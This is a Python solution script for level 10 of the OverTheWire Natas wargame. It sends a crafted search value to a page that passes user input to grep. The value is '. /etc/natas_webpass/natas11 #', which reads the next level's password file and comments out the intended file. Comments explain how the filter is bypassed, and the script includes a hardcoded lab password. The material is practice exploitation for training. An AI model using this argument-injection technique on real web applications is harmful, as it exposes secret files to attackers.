#!/bin/python3

import requests
import re
import html.parser

username = 'natas10'
password = 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'
#secret = "oubWYf2kBq" #gained from reversing the function in 8.php

url = 'http://%s.natas.labs.overthewire.org' % (username)
data = { "needle" : ". /etc/natas_webpass/natas11 #" ,"submit" : "submit" }

#for communicating with the website whilst maintaining session history
session = requests.Session()
response = session.post(url + '',data = data, auth = (username,password) )
content = html.unescape(response.text)

#for viewing the webpage
#print (content)

#for finding the password 
print (re.findall('<pre>\n(.*)\n</pre>',content)[0])


#passes through the key to a grep call presumably by system
#passthru("grep -i $key dictionary.txt") where $key is user input
#the input is being filtered to dissallow keys with ;|& in it 
#so can't use ; to run a different command
#can still search for all entries in the password file using grep
#and comment out the database file
#to allow for another command to be input then simply cat the password file
